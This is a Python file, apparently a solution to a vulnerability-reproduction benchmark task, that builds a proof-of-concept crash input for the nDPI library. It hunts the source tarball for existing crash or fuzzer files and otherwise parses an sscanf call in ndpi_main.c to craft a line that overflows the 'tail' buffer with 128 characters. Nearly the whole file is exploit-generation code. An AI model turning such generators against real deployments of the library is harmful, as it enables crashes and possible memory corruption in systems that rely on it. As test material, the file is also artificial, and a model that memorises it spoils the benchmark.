import os
import re
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._find_existing_poc(src_path)
        if poc is not None and len(poc) > 0:
            return poc

        poc = self._build_poc_from_source(src_path)
        if poc is not None and len(poc) > 0:
            return poc

        return b"A" * 56

    def _find_existing_poc(self, src_path: str) -> bytes | None:
        target_len = 56
        candidates = []

        try:
            with tarfile.open(src_path, "r:*") as tar:
                for m in tar.getmembers():
                    if not m.isreg():
                        continue

                    size = m.size
                    if size == 0 or size > 4096:
                        continue

                    name_lower = m.name.lower()
                    base = os.path.basename(name_lower)
                    _, ext = os.path.splitext(base)

                    # Skip obvious source/config/docs
                    if ext in (
                        ".c",
                        ".h",
                        ".cc",
                        ".cpp",
                        ".hpp",
                        ".java",
                        ".py",
                        ".sh",
                        ".md",
                        ".rst",
                        ".html",
                        ".xml",
                        ".yml",
                        ".yaml",
                        ".json",
                        ".toml",
                        ".cmake",
                        ".in.cmake",
                    ):
                        continue

                    score = 0
                    if "poc" in name_lower:
                        score += 100
                    if "crash" in name_lower or "crashes" in name_lower:
                        score += 80
                    if "id:" in name_lower or "id_" in name_lower or "id-" in name_lower:
                        score += 70
                    if "repro" in name_lower or "reproducer" in name_lower:
                        score += 60
                    if "afl" in name_lower or "fuzz" in name_lower:
                        score += 40
                    if "input" in name_lower or "testcase" in name_lower or "seed" in name_lower:
                        score += 30
                    if "overflow" in name_lower or "stack" in name_lower:
                        score += 20
                    if "ndpi" in name_lower:
                        score += 10

                    if ext in (".poc", ".bin", ".in", ".dat", ".raw", ".data", ""):
                        score += 10
                    if ext in (".txt", ".log"):
                        if "poc" in name_lower or "crash" in name_lower:
                            score += 5

                    if score <= 0:
                        continue

                    f = tar.extractfile(m)
                    if not f:
                        continue
                    content = f.read()
                    if not content:
                        continue

                    candidates.append((score, len(content), name_lower, content))
        except Exception:
            return None

        if not candidates:
            return None

        def sort_key(item):
            score, length, name, data = item
            return (-score, abs(length - target_len), length)

        candidates.sort(key=sort_key)
        return candidates[0][3]

    def _build_poc_from_source(self, src_path: str) -> bytes | None:
        try:
            with tarfile.open(src_path, "r:*") as tar:
                ndpi_member = None
                for m in tar.getmembers():
                    if not m.isreg():
                        continue
                    if m.name.endswith("ndpi_main.c"):
                        ndpi_member = m
                        break

                if ndpi_member is None:
                    return None

                f = tar.extractfile(ndpi_member)
                if not f:
                    return None
                data = f.read()
        except Exception:
            return None

        try:
            src = data.decode("utf-8", errors="ignore")
        except Exception:
            src = data.decode("latin1", errors="ignore")

        call_inside = self._find_sscanf_call_with_tail(src)
        if call_inside is None:
            return None

        args = self._split_arguments(call_inside)
        if len(args) < 3:
            return None

        dest_args = args[2:]
        tail_dest_index = None
        for i, arg in enumerate(dest_args):
            if re.search(r"\btail\b", arg):
                tail_dest_index = i
                break

        if tail_dest_index is None:
            return None

        tail_field_index = tail_dest_index + 1  # 1-based index among assigned conversions

        fmt_arg = args[1]
        fmt_string = self._extract_format_string(fmt_arg)
        if not fmt_string:
            return None

        input_str = self._build_input_from_format(fmt_string, tail_field_index, overflow_len=128)
        if not input_str:
            return None

        # Add newline to mimic typical line-based configuration input
        if not input_str.endswith("\n"):
            input_str += "\n"

        try:
            return input_str.encode("ascii", errors="ignore")
        except Exception:
            return input_str.encode("latin1", errors="ignore")

    def _find_sscanf_call_with_tail(self, src: str) -> str | None:
        pos = 0
        length = len(src)
        while True:
            idx = src.find("sscanf", pos)
            if idx == -1:
                return None

            before = src[idx - 1] if idx > 0 else ""
            after = src[idx + 6] if idx + 6 < length else ""
            if (before.isalnum() or before == "_") or (after.isalnum() or after == "_"):
                pos = idx + 6
                continue

            i = idx + 6
            while i < length and src[i].isspace():
                i += 1
            if i >= length or src[i] != "(":
                pos = idx + 6
                continue

            start = i
            depth = 0
            in_str = False
            esc = False
            str_ch = ""
            j = start
            end = None

            while j < length:
                c = src[j]
                if in_str:
                    if esc:
                        esc = False
                    elif c == "\\":
                        esc = True
                    elif c == str_ch:
                        in_str = False
                    j += 1
                    continue
                else:
                    if c == '"' or c == "'":
                        in_str = True
                        str_ch = c
                        j += 1
                        continue
                    if c == "(":
                        depth += 1
                    elif c == ")":
                        depth -= 1
                        if depth == 0:
                            end = j
                            break
                    j += 1

            if end is None:
                return None

            call_inside = src[start + 1 : end]
            if re.search(r"\btail\b", call_inside):
                return call_inside

            pos = idx + 6

    def _split_arguments(self, call_inside: str) -> list[str]:
        args = []
        cur = []
        depth = 0
        in_str = False
        esc = False
        str_ch = ""

        for c in call_inside:
            if in_str:
                cur.append(c)
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == str_ch:
                    in_str = False
                continue

            if c == '"' or c == "'":
                in_str = True
                str_ch = c
                cur.append(c)
                continue

            if c == "(":
                depth += 1
                cur.append(c)
                continue

            if c == ")":
                if depth > 0:
                    depth -= 1
                cur.append(c)
                continue

            if c == "," and depth == 0:
                arg = "".join(cur).strip()
                if arg:
                    args.append(arg)
                cur = []
                continue

            cur.append(c)

        if cur:
            arg = "".join(cur).strip()
            if arg:
                args.append(arg)

        return args

    def _extract_format_string(self, fmt_arg: str) -> str | None:
        s = fmt_arg.strip()
        start = s.find('"')
        if start == -1:
            return None

        i = start + 1
        n = len(s)
        esc = False
        parts = []
        current = []

        while i < n:
            c = s[i]
            if esc:
                current.append(c)
                esc = False
                i += 1
                continue

            if c == "\\":
                current.append(c)
                esc = True
                i += 1
                continue

            if c == '"':
                parts.append("".join(current))
                current = []
                i += 1
                while i < n and s[i].isspace():
                    i += 1
                if i < n and s[i] == '"':
                    i += 1
                    continue
                break
            else:
                current.append(c)
                i += 1

        if not parts and current:
            parts.append("".join(current))

        if not parts:
            return None

        return "".join(parts)

    def _build_input_from_format(self, fmt: str, tail_field_index: int, overflow_len: int = 128) -> str:
        out_parts: list[str] = []
        conv_index = 0
        i = 0
        length = len(fmt)

        while i < length:
            c = fmt[i]
            if c != "%":
                out_parts.append(c)
                i += 1
                continue

            if i + 1 < length and fmt[i + 1] == "%":
                out_parts.append("%")
                i += 2
                continue

            i += 1
            if i >= length:
                break

            star = False
            if fmt[i] == "*":
                star = True
                i += 1
                if i >= length:
                    break

            # width (digits)
            while i < length and fmt[i].isdigit():
                i += 1

            # length modifiers
            while i < length and fmt[i] in "hlLjztq":
                i += 1

            if i >= length:
                break

            spec_char = None

            if fmt[i] == "[":
                # scanset
                i += 1
                if i < length and fmt[i] == "^":
                    i += 1
                if i < length and fmt[i] == "]":
                    i += 1
                while i < length and fmt[i] != "]":
                    i += 1
                if i < length and fmt[i] == "]":
                    i += 1
                spec_char = "["
            else:
                spec_char = fmt[i]
                i += 1

            if not star and spec_char == "n":
                conv_index += 1
                continue

            assigned = not star
            field_index = None
            if assigned:
                conv_index += 1
                field_index = conv_index

            is_tail = field_index == tail_field_index
            field_str = self._generate_input_for_spec(spec_char, is_tail, overflow_len)
            out_parts.append(field_str)

        return "".join(out_parts)

    def _generate_input_for_spec(self, spec_char: str, is_tail: bool, overflow_len: int) -> str:
        if is_tail:
            length = overflow_len
        else:
            length = 3

        if spec_char in "diouxX":
            if is_tail:
                return "9" * length
            return "1"
        if spec_char in "eEfFgGaA":
            return "1.0"
        if spec_char == "c":
            if is_tail:
                return "C" * length
            return "C"
        if spec_char == "s":
            if is_tail:
                return "T" * length
            return "X"
        if spec_char == "[":
            ch = "B" if is_tail else "A"
            return ch * length
        if spec_char == "p":
            return "0x1"
        # Fallback for unknown specifiers
        return "Z" * length